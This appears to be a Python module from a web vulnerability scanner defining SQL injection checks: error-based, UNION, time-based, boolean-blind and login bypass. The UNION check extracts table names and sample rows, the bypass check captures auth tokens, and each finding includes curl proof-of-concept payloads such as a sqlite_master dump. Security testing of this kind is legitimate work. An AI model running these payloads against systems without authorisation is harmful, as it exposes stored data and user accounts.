"""
SQL Injection checks — powered by SqliEngine (nexus/tools/sqli_engine.py).

  SqliErrorCheck     : Technique E — error-based (double-confirmed)
  SqliUnionCheck     : Technique U — UNION exfiltration with canary + data dump
  SqliTimeCheck      : Technique T — time-based blind (3-sample, jitter-filtered)
  SqliAuthBypassCheck: Auth bypass OR-payloads (confirmed by token in response)
  SqliBooleanCheck   : Technique B — boolean blind (TRUE/FALSE response diff)

Anti-hallucination:
  Every technique uses a unique canary or double-confirmation.
  Time-based requires all 3 samples to exceed threshold.
  Auth bypass confirmed by actual token in response, NOT just HTTP 200.
"""
import re
from typing import Optional
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from nexus.tools.sqli_engine import (
    SqliEngine,
    SqliResult,
    test_auth_bypass,
    detect_db_error,
    _EXTRACT_TEMPLATES,
)
from .base import BaseScanCheck


# Shared engine instance (stateless — safe to share)
_ENGINE = SqliEngine()

# URLs confirmed as SQLite (skip time-based — SQLite has no SLEEP)
_CONFIRMED_SQLITE_URLS: set[str] = set()


# ---------------------------------------------------------------------------
# Helper: build PoC curl from SqliResult
# ---------------------------------------------------------------------------

def _build_poc(ip: InsertionPoint, payload: str) -> str:
    if ip.ip_type == IPType.QUERY_PARAM:
        from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
        parsed = urlparse(ip.url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[ip.name] = [payload]
        q = urlencode({k: v[0] for k, v in params.items()}, quote_via=lambda s, *_: s)
        url = urlunparse(parsed._replace(query=q))
        return f"curl -s -i '{url}'"
    elif ip.ip_type == IPType.BODY_PARAM:
        return f"curl -s -i -X POST '{ip.url}' -d '{ip.name}={payload}'"
    elif ip.ip_type == IPType.JSON_KEY:
        return (f"curl -s -i -X POST '{ip.url}' "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"{ ip.name }\":\"{payload}\"}}'")
    return f"# Inject: {payload!r} into {ip.name} at {ip.url}"


def _extraction_summary(result: SqliResult) -> str:
    parts = []
    if result.db_version:
        parts.append(f"DB version: {result.db_version}")
    if result.tables:
        parts.append(f"Tables ({len(result.tables)}): {', '.join(result.tables[:8])}")
    if result.columns:
        for tbl, cols in list(result.columns.items())[:3]:
            parts.append(f"{tbl}({', '.join(cols[:6])})")
    if result.sample_rows:
        for tbl, rows in list(result.sample_rows.items())[:2]:
            parts.append(f"Sample data from {tbl}: {rows[:200]}")
    return " | ".join(parts) if parts else ""


# ---------------------------------------------------------------------------
# SqliErrorCheck
# ---------------------------------------------------------------------------

class SqliErrorCheck(BaseScanCheck):
    check_id = "sqli-error"
    check_type = CheckType.ACTIVE
    name = "SQL Injection (Error-based)"
    description = "Detects SQL injection via database error messages — double-confirmed"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        r = await _ENGINE._test_error(
            client,
            insertion_point.url,
            insertion_point.method,
            insertion_point.ip_type.value,
            insertion_point.name,
            auth_headers=None,
        )
        if not r.confirmed:
            return []

        if r.dbms == "SQLite":
            _CONFIRMED_SQLITE_URLS.add(insertion_point.url)

        poc = _build_poc(insertion_point, r.winning_payload)
        req_raw = self._build_request_line(
            insertion_point.method, insertion_point.url, {}, r.winning_payload,
        )

        return [CheckResult(
            check_id=self.check_id,
            vulnerable=True,
            confidence=Confidence.CERTAIN,
            severity=Severity.HIGH,
            cvss=8.6,
            description=(
                f"SQL injection confirmed via {r.dbms} error message. "
                f"Payload: {r.winning_payload!r}. "
                f"Error snippet: {r.canary_proof[:150]}"
            ),
            evidence=self._make_evidence(
                request_raw=req_raw,
                response=r.attack_response,
                payload=r.winning_payload,
                highlighted_evidence=r.canary_proof[:500],
                poc_curl=(
                    f"# Error-based SQL injection — {r.dbms}:\n{poc}\n"
                    f"# Look for DB error in response"
                ),
            ),
            insertion_point=insertion_point,
        )]


# ---------------------------------------------------------------------------
# SqliUnionCheck
# ---------------------------------------------------------------------------

class SqliUnionCheck(BaseScanCheck):
    check_id = "sqli-union"
    check_type = CheckType.ACTIVE
    name = "SQL Injection (UNION-based Data Exfiltration)"
    description = "Confirms SQLi exploitability via UNION canary + extracts DB structure"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()
        if not (
            any(k in url_lower for k in ("search", "query", "filter", "find", "list", "get", "fetch")) or
            any(k in name_lower for k in ("q", "query", "search", "s", "term", "filter", "id", "name"))
        ):
            return []

        r = await _ENGINE._test_union(
            client,
            insertion_point.url,
            insertion_point.method,
            insertion_point.ip_type.value,
            insertion_point.name,
            auth_headers=None,
        )
        if not r.confirmed:
            return []

        # Data extraction phase
        r = await _ENGINE.extract(
            client,
            insertion_point.url,
            insertion_point.method,
            insertion_point.ip_type.value,
            insertion_point.name,
            r,
        )

        extraction = _extraction_summary(r)
        poc = _build_poc(insertion_point, r.winning_payload)

        # Build a step-by-step PoC
        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        return [CheckResult(
            check_id=self.check_id,
            vulnerable=True,
            confidence=Confidence.CERTAIN,
            severity=Severity.CRITICAL,
            cvss=9.1,
            description=(
                f"SQL Injection UNION exfiltration confirmed! "
                f"Canary '{r.canary_proof}' returned in response. "
                f"{r.union_col_count} columns, DBMS: {r.dbms}. "
                + (f"Extracted: {extraction}" if extraction else "Full DB extraction possible.")
            ),
            evidence=self._make_evidence(
                request_raw=self._build_request_line("GET", insertion_point.url, {}),
                response=r.attack_response,
                payload=r.winning_payload,
                highlighted_evidence=r.canary_proof,
                poc_curl=(
                    f"# Step 1 — confirm injection:\n"
                    f"{poc}\n\n"
                    f"# Step 2 — extract tables ({r.dbms}):\n"
                    f"{_build_poc(insertion_point, r.winning_payload.replace(r.canary_proof, '(SELECT group_concat(name) FROM sqlite_master WHERE type=chr(116)||chr(97)||chr(98)||chr(108)||chr(101))'))}\n\n"
                    f"# Step 3 — dump Users table:\n"
                    f"{_build_poc(insertion_point, r.winning_payload.replace(r.canary_proof, 'email'))}"
                ),
            ),
            insertion_point=insertion_point,
        )]


# ---------------------------------------------------------------------------
# SqliAuthBypassCheck
# ---------------------------------------------------------------------------

class SqliAuthBypassCheck(BaseScanCheck):
    check_id = "sqli-auth-bypass"
    check_type = CheckType.ACTIVE
    name = "SQL Injection (Authentication Bypass)"
    description = "Detects SQLi login bypass — OR payload returns auth token"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()

        if not any(k in url_lower for k in ("login", "signin", "auth", "session", "token", "dologin")):
            return []
        # Only inject into the username field, not password field (avoids duplicate findings)
        if not any(k in name_lower for k in ("email", "user", "login", "username", "uid", "uname", "account")):
            return []

        # Use the pass_field from context (injected by scan.py) or guess common names
        ctx_pass = insertion_point.context.get("login_pass_field", "")
        candidate_pass_fields = (
            [ctx_pass] if ctx_pass else ["password", "passw", "passwd", "pass", "pwd"]
        )
        hit = None
        # Use a fresh client for auth bypass — the shared client has session cookies that
        # interfere with baseline/attack URL comparison when checks run concurrently.
        async with httpx.AsyncClient(
            follow_redirects=True, timeout=15, verify=False,
        ) as fresh_client:
            for _pf in candidate_pass_fields:
                hit = await test_auth_bypass(
                    fresh_client,
                    insertion_point.url,
                    insertion_point.name,
                    _pf,
                    success_indicators=("token", "authentication", "access_token", "bearer", "jwt", "session"),
                )
                if hit:
                    break
        if not hit:
            return []

        payload, desc, resp = hit
        token_snippet = ""
        try:
            data = resp.json()
            token_snippet = str(data)[:200]
        except Exception:
            token_snippet = resp.text[:200]

        req_raw = self._build_request_line(
            "POST", insertion_point.url,
            {"Content-Type": "application/json"},
            f'{{"{insertion_point.name}":"{payload}","password":"x"}}',
        )
        curl = (
            f"# SQL injection auth bypass:\n"
            f"curl -s -X POST '{insertion_point.url}' \\\n"
            f"  -H 'Content-Type: application/json' \\\n"
            f"  -d '{{\"{ insertion_point.name }\":\"{payload}\",\"password\":\"x\"}}'\n"
            f"# Returns auth token → full account access"
        )

        return [CheckResult(
            check_id=self.check_id,
            vulnerable=True,
            confidence=Confidence.CERTAIN,
            severity=Severity.CRITICAL,
            cvss=9.8,
            description=(
                f"SQLi authentication bypass confirmed! {desc} payload "
                f"in '{insertion_point.name}' returned HTTP {resp.status_code} with auth token. "
                f"Response: {token_snippet}"
            ),
            evidence=self._make_evidence(
                request_raw=req_raw,
                response=resp,
                payload=payload,
                poc_curl=curl,
            ),
            insertion_point=insertion_point,
        )]


# ---------------------------------------------------------------------------
# SqliTimeCheck
# ---------------------------------------------------------------------------

class SqliTimeCheck(BaseScanCheck):
    check_id = "sqli-time"
    check_type = CheckType.ACTIVE
    name = "SQL Injection (Time-based Blind)"
    description = "Time-based blind SQLi — 3-sample measurement with jitter filter"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        # Skip SQLite endpoints (no SLEEP support)
        if insertion_point.url in _CONFIRMED_SQLITE_URLS:
            return []

        r = await _ENGINE._test_time(
            client,
            insertion_point.url,
            insertion_point.method,
            insertion_point.ip_type.value,
            insertion_point.name,
            auth_headers=None,
        )
        if not r.confirmed:
            return []

        poc = _build_poc(insertion_point, r.winning_payload)

        return [CheckResult(
            check_id=self.check_id,
            vulnerable=True,
            confidence=Confidence.FIRM,
            severity=Severity.HIGH,
            cvss=7.5,
            description=(
                f"Time-based blind SQL injection confirmed ({r.dbms}). "
                f"Evidence: {r.canary_proof}"
            ),
            evidence=self._make_evidence(
                request_raw=self._build_request_line(
                    insertion_point.method, insertion_point.url, {},
                ),
                response=None,
                payload=r.winning_payload,
                poc_curl=(
                    f"# Time-based blind SQLi — {r.dbms}:\n"
                    f"{poc}\n"
                    f"# Response should delay ~{SqliEngine.TIME_DELAY}s"
                ),
            ),
            insertion_point=insertion_point,
        )]


# ---------------------------------------------------------------------------
# SqliBooleanCheck (new — Technique B)
# ---------------------------------------------------------------------------

class SqliBooleanCheck(BaseScanCheck):
    check_id = "sqli-boolean"
    check_type = CheckType.ACTIVE
    name = "SQL Injection (Boolean-based Blind)"
    description = "Boolean-blind SQLi — TRUE/FALSE response diff, double-confirmed"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        r = await _ENGINE._test_boolean(
            client,
            insertion_point.url,
            insertion_point.method,
            insertion_point.ip_type.value,
            insertion_point.name,
            insertion_point.value or "test",
            auth_headers=None,
        )
        if not r.confirmed:
            return []

        return [CheckResult(
            check_id=self.check_id,
            vulnerable=True,
            confidence=Confidence.FIRM,
            severity=Severity.HIGH,
            cvss=7.5,
            description=(
                f"Boolean-based blind SQL injection confirmed. "
                f"Evidence: {r.canary_proof}"
            ),
            evidence=self._make_evidence(
                request_raw=self._build_request_line(
                    insertion_point.method, insertion_point.url, {},
                ),
                response=r.attack_response,
                baseline=r.baseline_response,
                payload=r.poc_payload,
                highlighted_evidence=r.canary_proof,
                poc_curl=(
                    "# Boolean-blind SQLi:\n"
                    "# TRUE (data returned): " + _build_poc(insertion_point, (insertion_point.value or "test") + "' AND 1=1--") + "\n"
                    "# FALSE (no data): " + _build_poc(insertion_point, (insertion_point.value or "test") + "' AND 1=2--") + "\n"
                    "# Compare response lengths — different = injectable"
                ),
            ),
            insertion_point=insertion_point,
        )]
